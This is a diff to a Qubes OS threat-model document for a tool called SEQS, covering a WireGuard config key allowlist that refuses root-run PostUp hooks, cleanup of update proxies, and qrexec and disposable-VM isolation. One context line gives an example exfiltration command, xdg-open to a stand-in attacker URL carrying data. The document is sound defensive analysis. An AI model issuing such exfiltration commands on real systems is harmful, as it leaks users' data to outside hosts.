@@ -248,6 +248,11 @@ Each apt-repo component below (Brave, Signal, Element, Docker, VS Code, GnosisVP
 - **Established by:** ✅ Software is installed from the configured,
   Debian-signed apt repositories. The provider configuration is supplied
   directly inside `A-wireguard`; SEQS does not download or authenticate it.
+  The importer accepts only comments, section headers and the keys provider
+  exports use (`PrivateKey`, `Address`, `DNS`, `MTU`, `ListenPort`,
+  `PublicKey`, `PresharedKey`, `Endpoint`, `AllowedIPs`,
+  `PersistentKeepalive`), so wg-quick hooks such as `PostUp`, which run as
+  root, are refused.
 - **Residual risk:** The VPN provider sees tunnel metadata and egress traffic,
   while the upstream network sees the VPN endpoint. The local forwarding
   killswitch protects client qubes, but `A-wireguard` itself retains upstream
@@ -273,7 +278,9 @@ Each apt-repo component below (Brave, Signal, Element, Docker, VS Code, GnosisVP
   (`20-seqs-gnosisvpn-updates.policy`) scoped to the selected GnosisVPN
   template instance(s); the runner resolves a configured DispVM UpdateVM
   through its template chain to a TemplateVM, and removes both proxy and
-  policy afterward (after a killed run, at the start of the next build). It
+  policy afterward (after a killed run, at the start of the next build; a
+  proxy killed before it was marked makes the next GnosisVPN build refuse
+  until it is removed by hand). It
   refuses an UpdateVM built on a Whonix gateway, behind which that firewall is
   not enforced.
 - **Residual risk:** The embedded key and fingerprint originate from the same
@@ -313,7 +320,7 @@ Each apt-repo component below (Brave, Signal, Element, Docker, VS Code, GnosisVP
   - For SEQS qubes WITHOUT `offline` / `no_handoff`, `A-brave` is a funnel for hostile links from all of them; its compromise is in scope. The policy verb is `allow`, **not `ask`**: any code running in those qubes can silently make `A-brave` open a chosen URL, to exfiltrate via DNS-in-URL, push the user at a phishing page, or chain a browser 0-day. `ask` would catch the unexpected programmatic case. Deferred — accepting the silent passthrough for ergonomic handoff.
   - For qubes WITH `offline` / `no_handoff` (default: `keepass`, the `qr-*` entries, `wallet-ledger`, `wallet-trezor`, `wireguard`, `gnosisvpn`), the channel is closed at the dom0 qrexec boundary, which a compromise of the qube cannot change (the dom0 file is root-owned and the 28- file precedes the 29- file), and in the qube's xdg config. `offline` implies `no_handoff` because qrexec is unaffected by `netvm=none`: an offline qube could otherwise exfiltrate with `xdg-open https://attacker/?DATA`.
   - New disposables are a similar route. The Qubes 4.2 and 4.3 default policy lets any qube start one from its `default_dispvm`, normally the networked `default-dvm`, without a prompt through seven services (`qubes.OpenInVM`, `qubes.OpenURL`, `qubes.StartApp`, `qubes.GetImageRGBA`, `qubes.VMShell`, `qubes.VMExec`, `qubes.VMExecGUI`), and the PDF converter package of a default dom0 adds `qubes.PdfConvert`; a disposable requested by its template (`@dispvm:<template>`) gets a dom0 prompt. The 28- denies close both (verified on Qubes 4.3: without them, a `no_handoff` wallet qube could run a command in a networked disposable through `qubes.VMShell` without a prompt).
-  - For `offline` qubes the primary control is `default_dispvm none`, set on `offline` app qubes, their named disposables, and the QR camera backends, so every `@dispvm` request from them fails; the runner re-checks it for `offline` app qubes and named disposables, and the sequential QR script for the camera-side qubes. Unnamed disposables such as `@dispvm:A-qr-camera` copy the template's explicit `none`; a disposable whose template never set `default_dispvm` would fall back to its own disposable template, which is offline here. The qrexec denies are a second layer. That `qvm-prefs` maps `none` to unset comes from reading the Qubes 4.3 source, not from tests on Qubes.
+  - For `offline` qubes the primary control is `default_dispvm none`, set on `offline` app qubes, their named disposables, and the QR camera backends, so every `@dispvm` request from them fails; the runner re-checks it for `offline` app qubes and named disposables, and the sequential QR script for the camera-side qubes. Unnamed disposables such as `@dispvm:A-qr-camera` copy the template's explicit `none`; a disposable whose template never set `default_dispvm` would fall back to its own disposable template, which is offline here. The qrexec denies are a second layer. `qvm-prefs ... none` sets an explicit None, not an inherited default; the runner requires exactly that, and the hardware check confirms it on Qubes 4.3.
   - The tag can be removed by any qube that the Admin API grants `admin.vm.tag.Remove`; SEQS and the default Qubes policy grant it to none.
   - Other default `ask` services, such as `qubes.Filecopy`, still prompt in dom0 and depend on the operator refusing unexpected dialogs.
 
